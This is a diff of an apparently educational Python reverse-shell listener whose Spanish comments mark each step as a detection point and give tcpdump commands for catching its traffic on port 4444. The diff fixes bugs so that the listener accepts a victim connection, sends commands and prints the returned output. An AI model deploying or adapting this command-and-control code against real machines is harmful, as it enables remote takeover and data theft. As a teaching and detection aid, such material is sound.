@@ -68,7 +68,7 @@ class Listener:
         # ┌─────────────────────────────────────────────────────────────────────────┐
         # │ ACEPTAR CONEXIÓN - PUNTO DE DETECCIÓN #2 ⚠️                             │
         # └─────────────────────────────────────────────────────────────────────────┘
-        connection, address = listener.accept()
+        self.connection, address = listener.accept()
             # accept()  → Bloquea hasta que una víctima se conecta
             # connection → Nuevo socket para comunicación con la víctima
             # address    → Tupla con (IP, Puerto) de la víctima
@@ -94,7 +94,7 @@ class Listener:
             # 🛡️ DETECCIÓN #3: Comandos en TEXTO PLANO visibles en red
             # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
         return self.connection.recv(1024)
-    
+
     def run(self):
         # ┌─────────────────────────────────────────────────────────────────────────┐
         # │ BUCLE PRINCIPAL - CONTROL REMOTO ACTIVO                                 │
@@ -108,25 +108,23 @@ class Listener:
                 # shell»»     → Prompt personalizado (firma detectable)
                 #
                 # 🛡️ DETECCIÓN: Prompt "shell»»" es firma única en logs de terminal
-        # ┌─────────────────────────────────────────────────────────────────────┐
-        # │ RECEPCIÓN DE RESULTADOS - EXFILTRACIÓN DE DATOS ⚠️                  │
-        # └─────────────────────────────────────────────────────────────────────┘
-        result = self.connection.recv(1024)
-            
-            # recv(1024) → Recibe hasta 1024 bytes de datos de la víctima
-            
-            # 🛡️ DETECCIÓN #4: Datos salientes desde víctima en puerto 4444
-            # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w c2.pcap
+            # ┌─────────────────────────────────────────────────────────────────────┐
+            # │ RECEPCIÓN DE RESULTADOS - EXFILTRACIÓN DE DATOS ⚠️                  │
+            # └─────────────────────────────────────────────────────────────────────┘
+            result = self.ejecutarRemoto(command)
+                # recv(1024) → Recibe hasta 1024 bytes de datos de la víctima
+                
+                # 🛡️ DETECCIÓN #4: Datos salientes desde víctima en puerto 4444
+                # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w c2.pcap
+            # ┌─────────────────────────────────────────────────────────────────────┐
+            # │ MOSTRAR RESULTADOS - HUELLA FORENSE #4                              │
+            # └─────────────────────────────────────────────────────────────────────┘
+            print(result.decode('utf-8', errors='ignore'))
+                # print()           → Muestra resultados en consola del atacante
+                # decode('utf-8')   → Convierte BYTES a STRING legible
+                # errors='ignore'   → Ignora caracteres inválidos (evita crashes)
+                
+                # 🛡️ DETECCIÓN: Evidencia forense de qué información fue comprometida
 
-        # ┌─────────────────────────────────────────────────────────────────────┐
-        # │ MOSTRAR RESULTADOS - HUELLA FORENSE #4                              │
-        # └─────────────────────────────────────────────────────────────────────┘
-        print(result.decode('utf-8', errors='ignore'))
-            # print()           → Muestra resultados en consola del atacante
-            # decode('utf-8')   → Convierte BYTES a STRING legible
-            # errors='ignore'   → Ignora caracteres inválidos (evita crashes)
-            
-            # 🛡️ DETECCIÓN: Evidencia forense de qué información fue comprometida
-
-escuchar=Listener("192.1681.39",4444)
+escuchar=Listener("192.168.1.39",4444)
 escuchar.run()
